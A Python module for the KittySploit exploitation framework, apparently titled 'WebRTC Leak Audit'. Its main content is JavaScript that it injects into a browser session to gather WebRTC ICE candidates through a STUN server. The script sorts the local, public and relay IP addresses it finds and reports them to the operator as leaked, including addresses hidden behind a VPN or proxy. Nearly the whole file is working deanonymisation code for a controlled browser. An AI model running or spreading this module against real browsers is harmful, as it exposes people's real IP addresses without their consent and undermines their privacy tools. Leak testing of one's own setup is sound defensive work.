from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "WebRTC Leak Audit",
		"description": "Collect WebRTC ICE candidates for IP leak detection",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	stun_server = OptString(
		"stun:stun.l.google.com:19302",
		"STUN server URL",
		False,
	)
	timeout = OptInteger(8, "ICE gather timeout (seconds)", False)

	def run(self):
		stun = json.dumps(str(self.stun_server or "stun:stun.l.google.com:19302").strip())
		timeout_ms = int(self.timeout or 8) * 1000

		code_js = f"""
		(function() {{
			const STUN = {stun};
			const TIMEOUT_MS = {timeout_ms};

			return new Promise(function(resolve) {{
				const RTCPeerConnection = window.RTCPeerConnection
					|| window.mozRTCPeerConnection
					|| window.webkitRTCPeerConnection;

				if (!RTCPeerConnection) {{
					resolve(JSON.stringify({{
						supported: false,
						error: 'RTCPeerConnection unavailable'
					}}));
					return;
				}}

				const out = {{
					supported: true,
					stun_server: STUN,
					candidates: [],
					ips: [],
					local_ips: [],
					public_ips: [],
					host_candidates: [],
					srflx_candidates: [],
					relay_candidates: [],
					mdns_masked: false,
					gathering_complete: false,
					error: null
				}};

				let finished = false;
				function done(payload) {{
					if (finished) {{ return; }}
					finished = true;
					resolve(JSON.stringify(payload));
				}}

				let pc;
				try {{
					pc = new RTCPeerConnection({{ iceServers: [{{ urls: STUN }}] }});
				}} catch (e) {{
					done({{ supported: false, error: e.message || String(e) }});
					return;
				}}

				function classifyIp(ip) {{
					if (!ip || ip.indexOf(':') !== -1) {{
						return 'ipv6';
					}}
					if (/^(10\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[01])\\.)/.test(ip)) {{
						return 'private';
					}}
					if (/^127\\./.test(ip) || ip === '0.0.0.0') {{
						return 'loopback';
					}}
					if (/^169\\.254\\./.test(ip)) {{
						return 'link_local';
					}}
					return 'public';
				}}

				function recordCandidate(candidateStr) {{
					if (!candidateStr) {{ return; }}
					out.candidates.push(candidateStr);
					if (candidateStr.indexOf('.local') !== -1) {{
						out.mdns_masked = true;
					}}
					const parts = candidateStr.split(' ');
					const ip = parts[4] || '';
					if (!ip || out.ips.indexOf(ip) !== -1) {{ return; }}
					out.ips.push(ip);
					const kind = classifyIp(ip);
					if (kind === 'private' || kind === 'link_local' || kind === 'loopback') {{
						out.local_ips.push(ip);
					}} else if (kind === 'public') {{
						out.public_ips.push(ip);
					}}
					if (candidateStr.indexOf(' typ host ') !== -1) {{
						out.host_candidates.push(ip);
					}} else if (candidateStr.indexOf(' typ srflx ') !== -1) {{
						out.srflx_candidates.push(ip);
					}} else if (candidateStr.indexOf(' typ relay ') !== -1) {{
						out.relay_candidates.push(ip);
					}}
				}}

				pc.onicecandidate = function(event) {{
					if (event && event.candidate && event.candidate.candidate) {{
						recordCandidate(event.candidate.candidate);
					}}
				}};

				pc.createDataChannel('kittysploit-audit');

				pc.createOffer()
					.then(function(offer) {{ return pc.setLocalDescription(offer); }})
					.catch(function(err) {{
						out.error = err.message || String(err);
						try {{ pc.close(); }} catch (e) {{}}
						done(out);
					}});

				setTimeout(function() {{
					out.gathering_complete = true;
					try {{ pc.close(); }} catch (e) {{}}
					done(out);
				}}, TIMEOUT_MS);
			}});
		}})();
		"""

		result = self.send_js_and_wait_for_response(
			code_js,
			timeout=float(int(self.timeout or 8) + 6),
		)
		if not result:
			print_error("Failed to run WebRTC leak audit")
			return False

		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse WebRTC audit response: {exc}")
			print_debug(f"Raw response: {result}")
			return False

		if not data.get("supported", False):
			print_error(data.get("error", "WebRTC is not available in this browser"))
			return False

		print_info("=" * 60)
		print_info("WebRTC ICE")
		print_info(f"  STUN server: {data.get('stun_server', '')}")
		print_info(f"  ICE candidates collected: {len(data.get('candidates', []))}")

		if data.get("mdns_masked"):
			print_warning("  mDNS host candidates detected — some local IPs may be masked (.local)")

		local_ips = data.get("local_ips", [])
		public_ips = data.get("public_ips", [])
		all_ips = data.get("ips", [])

		if local_ips:
			print_warning(f"  Local/private IPs leaked: {', '.join(local_ips)}")
		else:
			print_status("  No local/private IPv4 addresses observed")

		if public_ips:
			print_warning(f"  Public/reflexive IPs leaked: {', '.join(public_ips)}")
		else:
			print_status("  No public IPv4 addresses observed via srflx/host")

		if data.get("relay_candidates"):
			print_info(f"  Relay candidates: {', '.join(data['relay_candidates'])}")

		if not all_ips and not data.get("mdns_masked"):
			print_status("  No IP addresses extracted — browser may block WebRTC or ICE gathering failed")
		elif local_ips or public_ips:
			print_warning("  WebRTC may leak IPs past VPN/proxy")

		if data.get("error"):
			print_warning(f"  Gather error: {data['error']}")

		return True
